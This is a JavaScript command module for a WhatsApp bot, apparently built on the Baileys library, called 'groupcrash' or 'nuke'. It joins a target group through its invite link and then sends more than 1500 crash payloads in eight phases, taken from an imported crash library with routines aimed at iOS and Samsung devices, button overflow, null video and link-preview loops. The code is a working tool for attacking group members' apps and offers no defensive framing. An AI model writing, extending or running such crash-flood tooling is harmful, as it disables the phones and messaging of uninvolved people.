'use strict';
const { CrashLib } = require('../../lib/crashlib');

module.exports = {
    name: 'groupcrash',
    aliases: ['gcrash', 'crashgroup', 'gclink', 'groupkill', 'nuke', 'gc', 'obliterate'],
    category: 'crash',
    desc: 'ɴᴜᴋᴇ ᴀ ɢʀᴏᴜᴘ ᴠɪᴀ ɢʀᴏᴜᴘ ʟɪɴᴋ — ᴏᴠᴇʀᴅʀɪᴠᴇ ᴘᴀʏʟᴏᴀᴅ',
    usage: '.groupcrash <group_link>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}groupcrash <group_link>\n📝 *Example:* ${prefix}groupcrash https://chat.whatsapp.com/AbCdEfGhIjKlMnOp` 
            }, { quoted: msg });
        }
        
        const link = args[0];
        
        let crashLib = global.getCrashLib?.(sock);
        if (!crashLib) {
            crashLib = new CrashLib(sock);
        }
        
        await sock.sendMessage(ctx.from, { text: '🔍 ʀᴇsᴏʟᴠɪɴɢ ɢʀᴏᴜᴘ ʟɪɴᴋ...' }, { quoted: msg });
        
        try {
            // Resolve group link to JID
            const groupJid = await sock.groupAcceptInvite(link.split('/').pop());
            if (!groupJid) throw new Error('Failed to resolve group link');
            
            await sock.sendMessage(ctx.from, { text: `🎯 ɢʀᴏᴜᴘ ғᴏᴜɴᴅ: ${groupJid}\n☢️ ᴏᴠᴇʀᴅʀɪᴠᴇ ɴᴜᴋᴇ ɪɴɪᴛɪᴀᴛᴇᴅ...\n⚠️ ᴛʜɪs ᴡɪʟʟ sᴇɴᴅ 1500+ ᴘᴀʏʟᴏᴀᴅs` }, { quoted: msg });
            
            // ═══════════════════════════════════════════════════
            // PHASE 1: INITIAL BURST — ALL METHODS AT ONCE
            // ═══════════════════════════════════════════════════
            await Promise.allSettled([
                crashLib.iosInvisibleForce(groupJid),
                crashLib.buttonOverflow(groupJid),
                crashLib.samsung(groupJid),
                crashLib.vidxNull(groupJid),
                crashLib.linkPreviewLoop(groupJid, msg),
            ]);
            
            // ═══════════════════════════════════════════════════
            // PHASE 2: IOS INVISIBLE FORCE — 200 ROUNDS
            // ═══════════════════════════════════════════════════
            for (let i = 0; i < 200; i++) {
                await crashLib.iosInvisibleForce(groupJid);
                if (i % 20 === 0) await new Promise(r => setTimeout(r, 100));
            }
            
            // ═══════════════════════════════════════════════════
            // PHASE 3: SAMSUNG CRASH — 200 ROUNDS
            // ═══════════════════════════════════════════════════
            for (let i = 0; i < 200; i++) {
                await crashLib.samsung(groupJid);
                if (i % 20 === 0) await new Promise(r => setTimeout(r, 100));
            }
            
            // ═══════════════════════════════════════════════════
            // PHASE 4: BUTTON OVERFLOW — 100 ROUNDS
            // ═══════════════════════════════════════════════════
            for (let i = 0; i < 100; i++) {
                await crashLib.buttonOverflow(groupJid);
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
            }
            
            // ═══════════════════════════════════════════════════
            // PHASE 5: VIDX NULL V2 — 100 ROUNDS
            // ═══════════════════════════════════════════════════
            for (let i = 0; i < 100; i++) {
                await crashLib.vidxNull(groupJid);
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
            }
            
            // ═══════════════════════════════════════════════════
            // PHASE 6: LINK PREVIEW LOOP — 50 ROUNDS
            // ═══════════════════════════════════════════════════
            for (let i = 0; i < 50; i++) {
                await crashLib.linkPreviewLoop(groupJid, msg);
                if (i % 5 === 0) await new Promise(r => setTimeout(r, 250));
            }
            
            // ═══════════════════════════════════════════════════
            // PHASE 7: PARALLEL COMBINED BARRAGE — 20 WAVES
            // Each wave fires all 5 methods simultaneously
            // ═══════════════════════════════════════════════════
            for (let wave = 0; wave < 20; wave++) {
                await Promise.allSettled([
                    crashLib.iosInvisibleForce(groupJid),
                    crashLib.samsung(groupJid),
                    crashLib.buttonOverflow(groupJid),
                    crashLib.vidxNull(groupJid),
                    crashLib.linkPreviewLoop(groupJid, msg),
                ]);
                if (wave % 3 === 0) await new Promise(r => setTimeout(r, 300));
            }
            
            // ═══════════════════════════════════════════════════
            // PHASE 8: FINAL EXECUTEALL — 20 ROUNDS
            // ═══════════════════════════════════════════════════
            for (let i = 0; i < 20; i++) {
                await crashLib.executeAll(groupJid, msg);
                if (i % 4 === 0) await new Promise(r => setTimeout(r, 250));
            }
            
            return sock.sendMessage(ctx.from, { text: `✅ ᴏᴠᴇʀᴅʀɪᴠᴇ ɴᴜᴋᴇ ᴄᴏᴍᴘʟᴇᴛᴇ ᴏɴ ${groupJid}\n💀 ᴛʜᴇ ɢʀᴏᴜᴘ ɪs ᴄᴏᴍᴘʟᴇᴛᴇʟʏ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: 1500+` }, { quoted: msg });
        } catch (e) {
            return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
        }
    }
};